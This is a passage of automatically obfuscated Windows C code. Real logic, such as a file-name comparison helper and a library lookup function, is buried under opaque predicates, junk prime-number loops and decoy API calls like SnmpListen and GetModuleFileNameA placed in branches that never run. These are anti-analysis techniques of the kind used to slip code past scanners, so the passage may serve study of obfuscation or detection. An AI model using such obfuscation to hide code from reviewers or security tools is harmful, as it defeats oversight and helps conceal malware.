        if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
        {
          unsigned long v03d8db5679bff8fde75a6ed9bf10ebd6 = (unsigned long) 0x895d6ab4;
          unsigned long v815680fcba77f5836892a6fc4e14c80f = (unsigned long) 0xd7d912a1;
          void * v105b941a2bbcdd9507d912d3aa01541c = (void *) 0x8a8be160;
          int v760c298b2ea21917551101cd36196776 = (int) 0xc17cec78;
          if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
            {
              void * v64093aeda307c83e4f864bb248731cb0 = (void *) 0xc35a1460;
              void * v10c3ce05658a2a650dd7130689b3ccf0 = (void *) 0xd25f93ea;
              unsigned long v7328ea641bac104346d464e5ae3ce4d9 = (unsigned long) 0x10faebfb;
              unsigned long v6d6106a5cec86b4b1c8b5a49d3de0c0a = (unsigned long) 0x6fe48e1f;
              v6d6106a5cec86b4b1c8b5a49d3de0c0a = GetModuleFileNameA(v64093aeda307c83e4f864bb248731cb0, v10c3ce05658a2a650dd7130689b3ccf0, v7328ea641bac104346d464e5ae3ce4d9);
              if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
              {
                void * v203baac036a8b668f6499aaa4ec7bd02 = (void *) 0xf36e42cb;
                unsigned long v343ff0eb509ae44daf737ec6ffab6ca7 = (unsigned long) 0x778bc8d0;
                unsigned long ve17170b6fcbfebe477cfb23633f445f5 = (unsigned long) 0xe0378f5b;
                ve17170b6fcbfebe477cfb23633f445f5 = SnmpListen(v203baac036a8b668f6499aaa4ec7bd02, v343ff0eb509ae44daf737ec6ffab6ca7);
              }
            }
            int vd951c2c1e30705b0d03b26106f24be4f = (int) 0xc7ae7815;
            vd951c2c1e30705b0d03b26106f24be4f = GetLocaleInfoW(v03d8db5679bff8fde75a6ed9bf10ebd6, v815680fcba77f5836892a6fc4e14c80f, v105b941a2bbcdd9507d912d3aa01541c, v760c298b2ea21917551101cd36196776);
          }
        }
      }
      if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
      {
        while (v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque != ((unsigned int) 1))
        {
          v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque += (unsigned int) 2;
          if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
          {
            void * v484d76f8812c24f410787d89515c8864 = (void *) 0x09441d16;
            long v8420f60a91df04e9f7e67a80bb8349cf = (long) 0x8e370a43;
            if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
              {
                v8420f60a91df04e9f7e67a80bb8349cf = RoUnregisterForApartmentShutdown(v484d76f8812c24f410787d89515c8864);
              }
            }
          }
          if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
          {
            v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque = (unsigned int) 1;
            ve5edaa4e797a02a046402f94908d6766_computation_opaque = (unsigned int) 3;
            while ((ve5edaa4e797a02a046402f94908d6766_computation_opaque * ve5edaa4e797a02a046402f94908d6766_computation_opaque) <= v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque)
            {
              if ((v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque % ve5edaa4e797a02a046402f94908d6766_computation_opaque) == ((unsigned int) 0))
              {
                v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque = (unsigned int) 0;
              }
              if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
              {
                v3e818513176980e73f954286ed37a422_computation_opaque = v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque || v6823c9baff279319c573950f38c24ff3_random_opaque;
                v1bc53845b06214767e46f6b5afef442f_useless_opaque = va18c129a0bf44f26a56e018e2268d8b6_computation_opaque != v6823c9baff279319c573950f38c24ff3_random_opaque;
                v1bc53845b06214767e46f6b5afef442f_useless_opaque = ve26f1d8048af49db422418ee025875c4_useless_opaque - ve5edaa4e797a02a046402f94908d6766_computation_opaque;
                v31cc0d3e71436c870421f95e6d8b5029_useless_opaque = ve26f1d8048af49db422418ee025875c4_useless_opaque - v6823c9baff279319c573950f38c24ff3_random_opaque;
              }
              if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
              {
                ve5edaa4e797a02a046402f94908d6766_computation_opaque = ve5edaa4e797a02a046402f94908d6766_computation_opaque + ((unsigned int) 2);
              }
            }

          }
        }

        if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
        {
          if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
          {
            v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque = v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque / ve5edaa4e797a02a046402f94908d6766_computation_opaque;
            ve5edaa4e797a02a046402f94908d6766_computation_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque | ve5edaa4e797a02a046402f94908d6766_computation_opaque;
            v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque % v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
            v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = v1bc53845b06214767e46f6b5afef442f_useless_opaque != v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque;
            if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
            {
              v6823c9baff279319c573950f38c24ff3_random_opaque = v6823c9baff279319c573950f38c24ff3_random_opaque == v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
            }
            ve26f1d8048af49db422418ee025875c4_useless_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque || v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
          }
          if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
          {
            if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
            {
              v3e818513176980e73f954286ed37a422_computation_opaque = v1bc53845b06214767e46f6b5afef442f_useless_opaque | ((unsigned int) 117);
            }
          }
        }
        unsigned int v94793623540fe1b6b8f1cc5c54b17932_prime_opaque = v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
        v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque = (unsigned int) 1;
        v3e818513176980e73f954286ed37a422_computation_opaque = (unsigned int) 3;
        if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
        {
          if (!(((v94793623540fe1b6b8f1cc5c54b17932_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94793623540fe1b6b8f1cc5c54b17932_prime_opaque == ((unsigned int) 2))))
          {
            if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
            {
              if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
              {
                if (((v94793623540fe1b6b8f1cc5c54b17932_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94793623540fe1b6b8f1cc5c54b17932_prime_opaque == ((unsigned int) 2)))
                {
                  v94793623540fe1b6b8f1cc5c54b17932_prime_opaque = v94793623540fe1b6b8f1cc5c54b17932_prime_opaque | v31cc0d3e71436c870421f95e6d8b5029_useless_opaque;
                  v1bc53845b06214767e46f6b5afef442f_useless_opaque = va18c129a0bf44f26a56e018e2268d8b6_computation_opaque != v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
                  if (!(((v94793623540fe1b6b8f1cc5c54b17932_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94793623540fe1b6b8f1cc5c54b17932_prime_opaque == ((unsigned int) 2))))
                  {
                    va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = ve5edaa4e797a02a046402f94908d6766_computation_opaque - va18c129a0bf44f26a56e018e2268d8b6_computation_opaque;
                    v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque != ve5edaa4e797a02a046402f94908d6766_computation_opaque;
                    if (((v94793623540fe1b6b8f1cc5c54b17932_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94793623540fe1b6b8f1cc5c54b17932_prime_opaque == ((unsigned int) 2)))
                    {
                      v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque = v6823c9baff279319c573950f38c24ff3_random_opaque - va18c129a0bf44f26a56e018e2268d8b6_computation_opaque;
                    }
                  }
                  v6823c9baff279319c573950f38c24ff3_random_opaque = v3e818513176980e73f954286ed37a422_computation_opaque % ve5edaa4e797a02a046402f94908d6766_computation_opaque;
                }
              }
            }
          }
          void * vc0b9ae59fa9c8a28a5831acb877586c2 = (void *) 0xbc74b466;
          int va90637029673a08202f9a573e5f90422 = (int) 0x6be5be1f;
          if (((v94793623540fe1b6b8f1cc5c54b17932_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94793623540fe1b6b8f1cc5c54b17932_prime_opaque == ((unsigned int) 2)))
          {
            if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
            {
              va90637029673a08202f9a573e5f90422 = RemoveDllDirectory(vc0b9ae59fa9c8a28a5831acb877586c2);
              if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
              {
                if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
                {
                  v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque = v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque != ve5edaa4e797a02a046402f94908d6766_computation_opaque;
                  v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque == v1bc53845b06214767e46f6b5afef442f_useless_opaque;
                  ve26f1d8048af49db422418ee025875c4_useless_opaque = v3e818513176980e73f954286ed37a422_computation_opaque % v6823c9baff279319c573950f38c24ff3_random_opaque;
                  v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque = ve26f1d8048af49db422418ee025875c4_useless_opaque | v94793623540fe1b6b8f1cc5c54b17932_prime_opaque;
                  va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque < v31cc0d3e71436c870421f95e6d8b5029_useless_opaque;
                  if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
                  {
                    v94793623540fe1b6b8f1cc5c54b17932_prime_opaque = v1bc53845b06214767e46f6b5afef442f_useless_opaque < v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
                    v94793623540fe1b6b8f1cc5c54b17932_prime_opaque = ve5edaa4e797a02a046402f94908d6766_computation_opaque % v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque;
                    v3e818513176980e73f954286ed37a422_computation_opaque = v94793623540fe1b6b8f1cc5c54b17932_prime_opaque == v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque;
                    ve26f1d8048af49db422418ee025875c4_useless_opaque = v6823c9baff279319c573950f38c24ff3_random_opaque - ve26f1d8048af49db422418ee025875c4_useless_opaque;
                    v6823c9baff279319c573950f38c24ff3_random_opaque = va18c129a0bf44f26a56e018e2268d8b6_computation_opaque / ((unsigned int) 7);
                  }
                  v31cc0d3e71436c870421f95e6d8b5029_useless_opaque = v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque * v94793623540fe1b6b8f1cc5c54b17932_prime_opaque;
                }
              }
            }
          }
        }
        while ((v3e818513176980e73f954286ed37a422_computation_opaque * v3e818513176980e73f954286ed37a422_computation_opaque) <= va18c129a0bf44f26a56e018e2268d8b6_computation_opaque)
        {
          if ((va18c129a0bf44f26a56e018e2268d8b6_computation_opaque % v3e818513176980e73f954286ed37a422_computation_opaque) == ((unsigned int) 0))
          {
            v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque = (unsigned int) 0;
          }
          if ((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25)))
          {
            v3e818513176980e73f954286ed37a422_computation_opaque = v3e818513176980e73f954286ed37a422_computation_opaque + ((unsigned int) 2);
            if (!((((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 9)) + ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 16))) == ((v6823c9baff279319c573950f38c24ff3_random_opaque * v6823c9baff279319c573950f38c24ff3_random_opaque) * ((unsigned int) 25))))
            {
              va18c129a0bf44f26a56e018e2268d8b6_computation_opaque = v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque | v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque;
              v3e818513176980e73f954286ed37a422_computation_opaque = v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque - v31cc0d3e71436c870421f95e6d8b5029_useless_opaque;
              v31cc0d3e71436c870421f95e6d8b5029_useless_opaque = va18c129a0bf44f26a56e018e2268d8b6_computation_opaque / ve5edaa4e797a02a046402f94908d6766_computation_opaque;
              v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque = v6595c99a7e3cdb10646d27b86bc4a67f_computation_opaque < v5b16b8bdc11edf4cbc74e165beed8055_computation_opaque;
              v3e818513176980e73f954286ed37a422_computation_opaque = va18c129a0bf44f26a56e018e2268d8b6_computation_opaque % v6823c9baff279319c573950f38c24ff3_random_opaque;
              v31cc0d3e71436c870421f95e6d8b5029_useless_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque | v1bc53845b06214767e46f6b5afef442f_useless_opaque;
              v1bc53845b06214767e46f6b5afef442f_useless_opaque = v31cc0d3e71436c870421f95e6d8b5029_useless_opaque / v8facafc142329bc3a1905fd1c62a0b9f_computation_opaque;
            }
          }
        }

      }
    }

    unsigned int v92b7e0669b82ca3d1f97a0880026aa57_prime_opaque = va18c129a0bf44f26a56e018e2268d8b6_computation_opaque;
  }
  unsigned int v436d3137e71d118556fa3bf76e243670_useless_opaque = (unsigned int) 4192401554;
  unsigned int v47a7e47f1081199a40a897634f687912_random_opaque = (unsigned int) (&v436d3137e71d118556fa3bf76e243670_useless_opaque);
}

int compare_file_name(const wchar_t *path, const wchar_t *name)
{
  {
    {
      {
        const wchar_t *basename = path;
        while ((*basename) != 0)
        {
          basename++;
        }

        while ((*basename) != L'\\')
        {
          basename--;
        }

        basename++;
        return wcs_equals(basename, name);
        unsigned int v0676e3db52e5eb6cac008aa042287c8d_useless_opaque = (unsigned int) 667475695;
        unsigned int v7678d1edc257322b9b27ab06ae06d900_computation_opaque = (unsigned int) (&v0676e3db52e5eb6cac008aa042287c8d_useless_opaque);
        unsigned int v9ffdb7a6f0b1edf215063d82356ad7ae_true_opaque = (((v7678d1edc257322b9b27ab06ae06d900_computation_opaque * v7678d1edc257322b9b27ab06ae06d900_computation_opaque) + v7678d1edc257322b9b27ab06ae06d900_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      }
      unsigned int v14e214e62ec10884929b9914b44700ee_useless_opaque = (unsigned int) 1237737613;
      unsigned int v2a86539a2346538b8d244e426d594c5c_computation_opaque = (unsigned int) 0;
      unsigned int vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque = (unsigned int) 3;
      unsigned int v51d46f1348b3168ae8edbf61ba027e21_computation_opaque = (unsigned int) (&v14e214e62ec10884929b9914b44700ee_useless_opaque);
      v51d46f1348b3168ae8edbf61ba027e21_computation_opaque = (v51d46f1348b3168ae8edbf61ba027e21_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v51d46f1348b3168ae8edbf61ba027e21_computation_opaque < ((unsigned int) 3))
      {
        v51d46f1348b3168ae8edbf61ba027e21_computation_opaque = (unsigned int) 3;
      }
      while (v2a86539a2346538b8d244e426d594c5c_computation_opaque != ((unsigned int) 1))
      {
        v51d46f1348b3168ae8edbf61ba027e21_computation_opaque += (unsigned int) 2;
        v2a86539a2346538b8d244e426d594c5c_computation_opaque = (unsigned int) 1;
        vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque = (unsigned int) 3;
        while ((vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque * vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque) <= v51d46f1348b3168ae8edbf61ba027e21_computation_opaque)
        {
          if ((v51d46f1348b3168ae8edbf61ba027e21_computation_opaque % vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque) == ((unsigned int) 0))
          {
            v2a86539a2346538b8d244e426d594c5c_computation_opaque = (unsigned int) 0;
          }
          vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque = vfe102c5d543b6f22554a1d2cfffcca9e_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int vfae5d4839a83c0a8734cfdf2c8f4ae83_prime_opaque = v51d46f1348b3168ae8edbf61ba027e21_computation_opaque;
      unsigned int v5959822ad1faeeb33d6c58c40faa80cb_useless_opaque = (unsigned int) 2225409507;
      unsigned int vbc39ebd5fe62b93b25131b3194f5f492_computation_opaque = (unsigned int) (&v5959822ad1faeeb33d6c58c40faa80cb_useless_opaque);
      unsigned int vf9ebc1fd30e3772f5c22d98edeb6bc82_true_opaque = (((vbc39ebd5fe62b93b25131b3194f5f492_computation_opaque * vbc39ebd5fe62b93b25131b3194f5f492_computation_opaque) + vbc39ebd5fe62b93b25131b3194f5f492_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
    }
  }
  unsigned int ve4493efb28de68cda2f89caf46497bd1_useless_opaque = (unsigned int) 3587179715;
  unsigned int v4e0f3b3219bff584cc5daee3d4081a98_random_opaque = (unsigned int) (&ve4493efb28de68cda2f89caf46497bd1_useless_opaque);
}

const wchar_t *get_library_by_number(const wchar_t *buffer, int n)
{
  {
    unsigned int v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = (unsigned int) 3223757605;
    unsigned int v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = (unsigned int) 0;
    unsigned int v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque = (unsigned int) 3;
    unsigned int v095e5d529b8b1733f974e1456778da54_computation_opaque = (unsigned int) (&v5f9bc37a953debb4d7a4c1470b061888_useless_opaque);
    v095e5d529b8b1733f974e1456778da54_computation_opaque = (v095e5d529b8b1733f974e1456778da54_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
    if (v095e5d529b8b1733f974e1456778da54_computation_opaque < ((unsigned int) 3))
    {
      unsigned int vc3ff72d96433db1f7476619bd2f6b8f7_useless_opaque = (unsigned int) 1223587871;
      unsigned int v0533debc94ce93ea768d321df15ccfd2_computation_opaque = (unsigned int) 0;
      unsigned int ve64281cd7371196830e3e64ce51aa3ca_computation_opaque = (unsigned int) 3;
      unsigned int v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque = (unsigned int) (&vc3ff72d96433db1f7476619bd2f6b8f7_useless_opaque);
      v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque = (v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque < ((unsigned int) 3))
      {
        v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque = (unsigned int) 3;
      }
      while (v0533debc94ce93ea768d321df15ccfd2_computation_opaque != ((unsigned int) 1))
      {
        v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque += (unsigned int) 2;
        v0533debc94ce93ea768d321df15ccfd2_computation_opaque = (unsigned int) 1;
        ve64281cd7371196830e3e64ce51aa3ca_computation_opaque = (unsigned int) 3;
        while ((ve64281cd7371196830e3e64ce51aa3ca_computation_opaque * ve64281cd7371196830e3e64ce51aa3ca_computation_opaque) <= v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque)
        {
          if ((v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque % ve64281cd7371196830e3e64ce51aa3ca_computation_opaque) == ((unsigned int) 0))
          {
            v0533debc94ce93ea768d321df15ccfd2_computation_opaque = (unsigned int) 0;
          }
          ve64281cd7371196830e3e64ce51aa3ca_computation_opaque = ve64281cd7371196830e3e64ce51aa3ca_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int vffd7fdae8720aa518910925fdf9bd62d_prime_opaque = v40c42f7fdb4d3783a1b32d1ed4ecca4f_computation_opaque;
      v095e5d529b8b1733f974e1456778da54_computation_opaque = (unsigned int) 3;
    }
    while (v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque != ((unsigned int) 1))
    {
      v095e5d529b8b1733f974e1456778da54_computation_opaque += (unsigned int) 2;
      v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = (unsigned int) 1;
      v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque = (unsigned int) 3;
      while ((v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque * v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque) <= v095e5d529b8b1733f974e1456778da54_computation_opaque)
      {
        if ((v095e5d529b8b1733f974e1456778da54_computation_opaque % v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque) == ((unsigned int) 0))
        {
          v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = (unsigned int) 0;
        }
        v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque + ((unsigned int) 2);
      }

      unsigned int v52e59e502d09d350970030a7fc695c8c_useless_opaque = (unsigned int) 1905826726;
